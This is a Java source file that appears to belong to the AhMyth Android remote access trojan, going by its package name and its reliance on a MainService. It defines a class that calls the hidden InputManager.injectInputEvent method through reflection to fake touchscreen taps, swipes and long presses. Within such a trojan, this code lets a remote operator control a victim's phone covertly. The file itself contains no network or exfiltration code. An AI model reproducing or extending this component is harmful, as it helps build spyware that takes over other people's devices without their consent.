package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.hardware.input.InputManager;
import android.os.Build;
import android.os.SystemClock;
import android.util.Log;
import android.view.InputDevice;
import android.view.InputEvent;
import android.view.MotionEvent;

import java.lang.reflect.Method;

public class InputInjectionManager {
    
    private static final String TAG = "InputInjection";
    
    private Object inputManager;
    private Method injectInputEventMethod;
    private boolean isInitialized = false;
    
    public InputInjectionManager() {
        initializeReflection();
    }
    
    /**
     * Initialize reflection to access hidden InputManager methods
     */
    private void initializeReflection() {
        try {
            Context context = MainService.getContextOfApplication();
            if (context == null) {
                Log.e(TAG, "Context is null");
                return;
            }
            
            // Get InputManager instance
            inputManager = context.getSystemService(Context.INPUT_SERVICE);
            
            if (inputManager == null) {
                Log.e(TAG, "InputManager is null");
                return;
            }
            
            // Get the hidden injectInputEvent method
            Class<?> inputManagerClass = inputManager.getClass();
            
            // Try different method signatures based on Android version
            try {
                // API 16+
                injectInputEventMethod = inputManagerClass.getMethod(
                    "injectInputEvent",
                    InputEvent.class,
                    int.class
                );
            } catch (NoSuchMethodException e) {
                // API 14-15
                injectInputEventMethod = inputManagerClass.getMethod(
                    "injectInputEvent",
                    InputEvent.class
                );
            }
            
            injectInputEventMethod.setAccessible(true);
            isInitialized = true;
            
            Log.i(TAG, "Input injection initialized successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize input injection", e);
            isInitialized = false;
        }
    }
    
    /**
     * Inject a touch event
     * @param x X coordinate
     * @param y Y coordinate
     * @param action MotionEvent action (DOWN, UP, MOVE)
     * @return true if successful
     */
    public boolean injectTouch(int x, int y, int action) {
        if (!isInitialized) {
            Log.e(TAG, "Input injection not initialized");
            return false;
        }
        
        try {
            long eventTime = SystemClock.uptimeMillis();
            
            MotionEvent event = MotionEvent.obtain(
                eventTime,      // downTime
                eventTime,      // eventTime
                action,         // action (DOWN, UP, MOVE)
                (float) x,      // x
                (float) y,      // y
                0               // metaState
            );
            
            // Set event source as touchscreen
            event.setSource(InputDevice.SOURCE_TOUCHSCREEN);
            
            // Inject the event
            boolean result = injectEvent(event);
            
            // Recycle the event
            event.recycle();
            
            return result;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to inject touch event", e);
            return false;
        }
    }
    
    /**
     * Inject a swipe gesture
     * @param x1 Start X
     * @param y1 Start Y
     * @param x2 End X
     * @param y2 End Y
     * @param duration Duration in milliseconds
     * @return true if successful
     */
    public boolean injectSwipe(int x1, int y1, int x2, int y2, long duration) {
        if (!isInitialized) {
            return false;
        }
        
        try {
            // Touch down
            injectTouch(x1, y1, MotionEvent.ACTION_DOWN);
            
            // Calculate steps
            int steps = (int) (duration / 10); // 10ms per step
            float stepX = (float) (x2 - x1) / steps;
            float stepY = (float) (y2 - y1) / steps;
            
            // Move
            for (int i = 1; i < steps; i++) {
                int x = x1 + (int) (stepX * i);
                int y = y1 + (int) (stepY * i);
                injectTouch(x, y, MotionEvent.ACTION_MOVE);
                Thread.sleep(10);
            }
            
            // Touch up
            injectTouch(x2, y2, MotionEvent.ACTION_UP);
            
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to inject swipe", e);
            return false;
        }
    }
    
    /**
     * Inject a long press
     * @param x X coordinate
     * @param y Y coordinate
     * @param duration Duration in milliseconds
     * @return true if successful
     */
    public boolean injectLongPress(int x, int y, long duration) {
        if (!isInitialized) {
            return false;
        }
        
        try {
            // Touch down
            injectTouch(x, y, MotionEvent.ACTION_DOWN);
            
            // Wait
            Thread.sleep(duration);
            
            // Touch up
            injectTouch(x, y, MotionEvent.ACTION_UP);
            
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to inject long press", e);
            return false;
        }
    }
    
    /**
     * Internal method to inject InputEvent via reflection
     * @param event The event to inject
     * @return true if successful
     */
    private boolean injectEvent(InputEvent event) {
        try {
            Object result;
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                // API 16+: injectInputEvent(InputEvent, int)
                // Mode: 0 = INJECT_INPUT_EVENT_MODE_ASYNC
                //       1 = INJECT_INPUT_EVENT_MODE_WAIT_FOR_RESULT
                //       2 = INJECT_INPUT_EVENT_MODE_WAIT_FOR_FINISH
                result = injectInputEventMethod.invoke(inputManager, event, 0);
            } else {
                // API 14-15: injectInputEvent(InputEvent)
                result = injectInputEventMethod.invoke(inputManager, event);
            }
            
            return result != null && (Boolean) result;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to invoke injectInputEvent", e);
            return false;
        }
    }
    
    /**
     * Check if input injection is available
     * @return true if initialized
     */
    public boolean isAvailable() {
        return isInitialized;
    }
}

